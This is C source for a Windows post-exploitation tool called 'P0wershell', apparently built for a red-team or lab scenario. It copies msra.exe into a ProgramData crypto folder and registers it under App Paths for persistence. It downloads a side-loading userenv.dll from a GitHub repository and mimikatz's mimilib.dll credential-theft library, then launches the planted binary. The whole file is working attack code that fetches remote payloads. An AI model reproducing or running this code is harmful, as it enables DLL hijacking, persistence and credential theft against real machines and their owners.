#include <windows.h>
#include <stdio.h>
#include <conio.h>
#include <tlhelp32.h>
#include <urlmon.h>
#include <shlobj.h>

#pragma comment(lib, "urlmon.lib")

BOOL WINAPI IsUserAnAdmin(void);

static void log_msg(const char* msg) {
    FILE* f = fopen("C:\\p0wershell.log", "a");
    if (f) { fprintf(f, "%s\n", msg); fclose(f); }
}

static void press_exit(int code, const char* why) {
    char buf[256];
    snprintf(buf, sizeof(buf), "P0wershell exiting (%d)\n%s", code, why ? why : "");
    log_msg(buf);
    MessageBoxA(NULL, buf, "P0wershell", MB_OK | MB_ICONINFORMATION);
    exit(code);
}

int main(void) {
    { FILE* m = fopen("C:\\p0wershell.started", "w"); if (m) { fputs("1", m); fclose(m); } }
    DeleteFileA("C:\\p0wershell.log");
    log_msg("[+] P0wershell started");

    if (!IsUserAnAdmin()) {
        printf("[-] Not running as admin.\n");
        press_exit(1, "[-] Not running as admin.");
    }

    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    printf("[+] Path: %s\n", path);
    if (lstrcmpiA(path, "C:\\Windows\\System32\\P0wershell.exe") != 0)
        printf("[*] Warning: not running from System32, post-exploitation will proceed anyway\n");

    printf("[+] Running in Elevated Session.\n");

    DWORD parentPID = 0;
    DWORD myPID = GetCurrentProcessId();
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe = { .dwSize = sizeof(PROCESSENTRY32) };
        if (Process32First(snap, &pe)) {
            do {
                if (pe.th32ProcessID == myPID) {
                    parentPID = pe.th32ParentProcessID;
                    break;
                }
            } while (Process32Next(snap, &pe));
        }
        CloseHandle(snap);
    }

    const char* parentName = "unknown";
    snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe = { .dwSize = sizeof(PROCESSENTRY32) };
        if (Process32First(snap, &pe)) {
            do {
                if (pe.th32ProcessID == parentPID) {
                    parentName = pe.szExeFile;
                    break;
                }
            } while (Process32Next(snap, &pe));
        }
        CloseHandle(snap);
    }

    printf("[+] Parent PID: %lu (%s)\n", parentPID, parentName);

    const char *targetDir = "C:\\ProgramData\\Microsoft\\Crypto\\RSA\\S-1-5-18";
    char targetMsra[MAX_PATH];
    char targetUserenv[MAX_PATH];
    char targetMimilib[MAX_PATH];
    wsprintfA(targetMsra, "%s\\msra.exe", targetDir);
    wsprintfA(targetUserenv, "%s\\userenv.dll", targetDir);
    wsprintfA(targetMimilib, "%s\\mimilib.dll", targetDir);

    {  /* ponytail: SHCreateDirectoryExA creates intermediates recursively */
        int hr = SHCreateDirectoryExA(NULL, targetDir, NULL);
        if (hr != ERROR_SUCCESS && hr != ERROR_ALREADY_EXISTS) {
            printf("[-] Failed to create directory (0x%lx)\n", hr);
            press_exit(1, "[-] Failed to create target directory.");
        }
    }
    printf("[+] Directory created: %s\n", targetDir);
    log_msg("[+] Target directory ready");

    if (!CopyFileA("C:\\Windows\\System32\\msra.exe", targetMsra, FALSE)) {
        printf("[-] Failed to copy msra.exe (%lu)\n", GetLastError());
        press_exit(1, "[-] Failed to copy msra.exe.");
    }
    printf("[+] msra.exe copied\n");
    log_msg("[+] msra.exe copied");

    HKEY hKey;
    LONG regRet = RegCreateKeyExA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\msra.exe",
        0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL);
    if (regRet != ERROR_SUCCESS) {
        printf("[-] Failed to open registry key (%ld)\n", regRet);
        press_exit(1, "[-] Failed to set registry key.");
    }
    RegSetValueExA(hKey, NULL, 0, REG_SZ, (BYTE*)targetMsra, lstrlenA(targetMsra) + 1);
    RegCloseKey(hKey);
    printf("[+] Registry key set\n");
    log_msg("[+] Registry key set");

    const char *dllBaseUrl = "https://github.com/Justanother-engineer/scenario4/raw/refs/heads/main";
    char dllUrl[MAX_PATH];
    wsprintfA(dllUrl, "%s/userenv.dll", dllBaseUrl);
    printf("[+] Downloading userenv.dll...\n");
    HRESULT hr = URLDownloadToFileA(NULL, dllUrl, targetUserenv, 0, NULL);
    if (hr != S_OK)
        printf("[-] userenv.dll download failed (0x%lx) — place it manually\n", hr);
    else
        printf("[+] userenv.dll downloaded\n");

    printf("[+] Downloading mimilib.dll...\n");
    hr = URLDownloadToFileA(NULL,
        "https://raw.githubusercontent.com/ParrotSec/mimikatz/master/x64/mimilib.dll",
        targetMimilib, 0, NULL);
    if (hr != S_OK)
        printf("[-] mimilib.dll download failed (0x%lx) — place it manually\n", hr);
    else
        printf("[+] mimilib.dll downloaded\n");

    STARTUPINFOA si = { .cb = sizeof(si) };
    PROCESS_INFORMATION pi;
    if (CreateProcessA(targetMsra, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        printf("[+] msra.exe launched (PID: %lu)\n", pi.dwProcessId);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        printf("[-] Failed to launch msra.exe (%lu)\n", GetLastError());
    }

    printf("Press 'q' to exit\n");
    Sleep(200);
    while (_getch() != 'q') {}
    press_exit(0, "[+] P0wershell completed.");
}
